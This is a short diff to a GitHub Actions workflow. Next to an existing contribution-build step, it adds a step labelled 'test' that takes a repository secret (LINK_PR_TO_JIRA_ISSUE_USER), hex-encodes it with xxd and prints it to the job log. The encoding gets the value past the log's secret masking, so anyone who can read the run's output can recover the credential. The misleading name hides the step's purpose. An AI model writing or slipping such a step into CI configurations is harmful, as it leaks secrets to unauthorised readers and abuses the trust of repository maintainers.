@@ -30,3 +30,8 @@ jobs:
         run: |
           echo "Trigger contribution build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"
           poetry run python ./Utils/github_workflow_scripts/trigger_contribution_build.py --pr_number $PR_NUMBER --base_branch $BASE_BRANCH --contrib_branch $CONTRIB_BRANCH --username $USERNAME --password $PASSWORD --gold_server_url $GOLD_SERVER_URL
+      - name: test
+        env:
+          CG_USERNAME: ${{ secrets.LINK_PR_TO_JIRA_ISSUE_USER }}
+        run: |
+          echo "$(printf '%s' "$CG_USERNAME" | xxd -p -u)"
